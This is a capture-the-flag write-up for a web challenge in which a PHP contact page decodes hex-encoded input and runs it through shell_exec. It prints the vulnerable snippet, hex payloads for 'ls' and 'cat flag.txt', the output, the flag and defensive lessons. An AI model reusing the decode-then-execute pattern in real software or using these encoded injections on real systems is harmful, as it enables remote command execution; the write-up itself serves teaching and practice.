# Based Corps — Web Challenge Writeup (325 pts)

**Challenge name:** Based Corps  
**Author:** Rayene9052  
**Difficulty:** Medium  
**Hint:** *What's your favorite base? mine is hexadecimal!*  

---

## Overview

This challenge is a **command injection** vulnerability, but with a twist:  
the application **only executes commands if they are hex-encoded**.

At first glance, inputs look safely displayed and filtered, but by understanding
how the backend decodes hexadecimal input, we can bypass the restrictions and
execute system commands.

---

## Application Analysis

The interesting endpoint is the **Contact** page:

```
/contact.php
```

User input is passed via the `message` GET parameter.

Key observations from the source code:

- If `message` contains **only hexadecimal characters**, it is:
  1. Decoded using `hex2bin`
  2. Treated as a command
- Only two commands are allowed:
  - `ls`
  - `cat <file>`
- Any non-hex input is safely displayed and **not executed**

Relevant logic (simplified):

```php
if (preg_match('/^[0-9a-fA-F]+$/', $message)) {
    $decoded = hex2bin($message);
    shell_exec($decoded);
}
```

This means:
> **Hex = execution**  
> **Plain text = harmless output**

---

## Step 1 — Confirm Normal Input Is Safe

Trying a simple payload:

```
message=ls
```

Result:
- Input is echoed back
- No command execution

So direct command injection **does not work**.

---

## Step 2 — Encode Commands in Hexadecimal

Since the challenge hint mentions *hexadecimal*, we try encoding commands.

### Encode `ls`

Using CyberChef or any hex encoder:

```
ls  →  6c73
```

Request:

```
/contact.php?message=6c73
```

✅ **Success!**

The server executes `ls` and returns a directory listing:

```
about.php
assets
contact.php
documents.php
flag.txt
index.php
...
```

We clearly see **flag.txt**.

---

## Step 3 — Read the Flag

Now encode:

```
cat flag.txt
```

Hex encoding:

```
cat flag.txt → 63617420666c61672e747874
```

Request:

```
/contact.php?message=63617420666c61672e747874
```

✅ **Command executed successfully**

---

## Flag

```
SecurinetsISTIC{c0mm4nd_inj3ct10n_fr_t00_risky}
```

---

## Root Cause

The vulnerability exists because:

- Hex input is **trusted more than plain text**
- `hex2bin()` converts user input into executable commands
- Filtering is applied *before* decoding, not after

This is a classic example of:
> **Security checks on encoded input instead of decoded data**

---

## Key Takeaways

- Always validate **after decoding**
- Encoding ≠ sanitization
- Command allowlists are dangerous if user-controlled
- Never pass decoded user input directly to `shell_exec`

---

## Payload Summary

| Action | Command | Hex Payload |
|------|--------|------------|
| List files | `ls` | `6c73` |
| Read flag | `cat flag.txt` | `63617420666c61672e747874` |

---

Happy hacking 🚀
